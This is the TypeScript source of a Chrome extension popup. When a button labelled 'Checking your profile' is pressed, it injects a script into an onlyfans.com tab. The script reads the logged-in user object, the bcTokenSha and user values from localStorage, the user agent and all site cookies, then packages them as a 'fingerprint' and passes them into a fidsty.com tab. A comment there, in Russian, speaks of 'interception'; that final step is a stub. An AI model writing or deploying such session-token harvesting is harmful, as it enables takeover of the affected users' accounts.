(async () => {
    const form = <HTMLFormElement>document.querySelector('[id="getMyFingerprint"]');

    if (form) {
        form.onsubmit = async (e: SubmitEvent | any) => {
            e.preventDefault();

            const { submitter } = e;

            if (submitter) {
                submitter.disabled = true;

                submitter.textContent = 'Checking your profile...';

                const tabs = await chrome.tabs.query({
                    currentWindow: true,
                    url: [
                        "*://onlyfans.com/*",
                    ]
                });

                let tab = tabs.pop();

                let isNewTab = false;

                if (tab) { } else {
                    tab = await chrome.tabs.create({
                        active: true,
                        url: 'https://onlyfans.com'
                    });

                    isNewTab = true;
                }

                const { id: tabId } = tab;

                await new Promise<void>((resolve, reject) => {
                    const observer = async () => {
                        const tab = await chrome.tabs.get(tabId);

                        const { status } = tab;

                        if ('complete' == status) {
                            resolve();

                            return;
                        }

                        setTimeout(observer, 1000);
                    };

                    observer()
                });

                const executed = await chrome.scripting.executeScript({
                    target: { tabId: tabId },
                    world: "MAIN",
                    func: async () => new Promise((resolve, reject) => {
                        const observer = () => {
                            const app: any = document.querySelector('[id="app"]');

                            if (app) {
                                const { __vue__: vue } = app;

                                const { isAuth } = vue;

                                if (isAuth) {
                                    const { authUser } = vue;

                                    const { userAgent } = navigator;

                                    const bcTokenSha = localStorage.getItem('bcTokenSha');
                                    const userId = localStorage.getItem('user');

                                    resolve({
                                        authUser,
                                        userAgent,
                                        bcTokenSha,
                                        userId
                                    });

                                    return;
                                }
                            }

                            setTimeout(observer, 100);
                        };

                        observer();
                    }),
                });

                const { result } = executed[0];

                const cookies = await chrome.cookies.getAll({
                    url: 'https://onlyfans.com'
                });

                const fingerprint = {
                    cookies,
                    ...result,
                };

                submitter.textContent = 'Fingerprint collected';

                if (isNewTab) {
                    chrome.tabs.remove(tabId);
                }

                {
                    const tabs = await chrome.tabs.query({
                        url: [
                            "*://fidsty.com/*",
                            "*://*.fidsty.com/*"
                        ]
                    });

                    const tab = tabs.pop();

                    const { id: tabId } = tab;

                    chrome.tabs.update(tabId, {
                        active: true,
                    });

                    chrome.scripting.executeScript({
                        target: { tabId: tabId },
                        world: "MAIN",
                        func: (fingerprint: any) => {
                            // TODO: уведомить сайт о перехвате отпечатка
                        },
                        args: [fingerprint]
                    });
                }

                window.close();
            }

            return true;
        };
    }
})();